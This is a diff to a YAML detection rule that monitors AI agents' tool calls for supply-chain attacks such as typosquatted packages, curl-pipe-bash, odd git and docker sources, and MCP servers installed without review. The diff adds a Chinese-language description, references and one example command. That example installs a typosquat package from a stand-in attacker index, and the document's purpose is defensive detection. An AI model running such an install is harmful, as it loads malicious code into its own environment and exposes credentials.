@@ -94,3 +94,15 @@ sql_template: |
       -- docker pull from non-standard registry (v1.1.0)
       OR match(lower(tool_input), 'docker\s+pull\s+[a-z0-9][a-z0-9.\-]*/[a-z0-9\-]+:[a-z0-9.\-]+')
     )
+translations:
+  zh-CN:
+    name: "供应链监视"
+    description: |
+      监控智能体的工具调用中可能将恶意依赖引入智能体运行环境的软件包安装命令。v1.1.0 新增对抢注式(typosquat)安装模式的检测(安装名称与合法 AI 库相似的软件包——LiteLLM PyPI 供应链攻陷事件,2026 年 3 月)、从非标准主机 git clone、通过 curl-pipe-bash 或 wget-pipe-sh 直接执行脚本、uv/pipx/poetry 包管理器,以及从未验证注册表拉取 Docker 镜像的检测。通过将安装命令与可疑来源指标相结合,将 fp_rate 从高降至中。v1.3.0 新增:gem install、go install、composer require(Ruby/Go/PHP 包管理器);npx 作用域包安装(@scope/pkg)——用于 LLM 编码智能体安装 npm 工具;Sigilsec 2026《AI 智能体供应链安全现状》报告记录了智能体在几乎不做审查(仅 12 个 GitHub star,无评审)的情况下从 Discord/GitHub 安装 MCP 服务器的现象。RE2 修复:git clone 负向前瞻(?!...)→ 改为 NOT LIKE 条件(RE2 不支持前瞻)。
+
+      参考文献:OWASP LLM05:2025(供应链)、LiteLLM PyPI 供应链攻陷事件,2026 年 3 月 -
+      - https://dev.to/deeptishuklatfy/your-ai-gateway-just-became-an-attack-vector-anatomy-of-the-litellm-supply-chain-compromise-1g7m,
+      - https://dev.to/precogs_ai/litellm-hit-by-credential-stealing-supply-chain-attack-complete-technical-breakdown-4550,
+      - https://www.cremit.io/blog/ai-supply-chain-attack-clinejection,
+      - https://agentfred.ai/blog/litellm-supply-chain-attack,
+      Example: tool_input="pip install litellm-callbacks --extra-index-url https://pypi.attacker.com/simple/" (typosquat package via alternate index — LiteLLM attack vector)
